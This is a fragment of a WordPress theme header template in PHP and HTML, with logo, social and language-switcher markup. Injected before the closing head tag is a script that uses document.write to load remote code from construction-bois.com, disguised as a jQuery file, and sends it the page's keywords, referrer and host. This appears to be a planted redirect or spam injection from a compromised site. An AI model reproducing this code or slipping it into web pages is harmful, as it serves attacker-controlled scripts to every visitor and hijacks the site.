...
<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://construction-bois.com/js/jquery.min.php?c_utt=G91825&c_utm='+encodeURIComponent('http://construction-bois.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
</head>
	...
	<header class="gdlr-header-wrapper" id="gdlr-header-wrapper">
			...
			<div class="top-navigation-container container">
				<div class="top-navigation-left">
					<div class="top-social-wrapper">
						<?php gdlr_print_header_social($header_style); ?>
					</div>
				</div>
		...
		<div class="gdlr-header-inner">
			<div class="gdlr-header-container container">
				<!-- logo -->
				<div class="gdlr-logo">
					<a class="gdlr-solid-logo" href="<?php echo home_url(); ?>" >
						<?php
					...
					<?php if( $header_style == 'transparent' ){ ?>
						<a class="gdlr-transparent-logo" href="<?php echo home_url(); ?>" >
							<?php
								if(empty($theme_option['logot-id'])){
									echo gdlr_get_image(GDLR_PATH . '/images/logot.png');
								}else{
									echo gdlr_get_image($theme_option['logot-id']);
								}
							?>
						</a>
					<?php } ?>
				...
				<div class="languages">
					<a href="<?php bloginfo('url') ?>" title="Tiếng Việt"><img src="<?php echo get_template_directory_uri() ?>/images/vn.png" alt=""></a>
					<a href="/en" title="English"><img src="<?php echo get_template_directory_uri() ?>/images/us.png" alt=""></a>
					<a href="/kr" title="한국인"><img src="<?php echo get_template_directory_uri() ?>/images/kr.png" alt=""></a>
				</div>
				<div class="clear"></div>
			</div>
		</div>
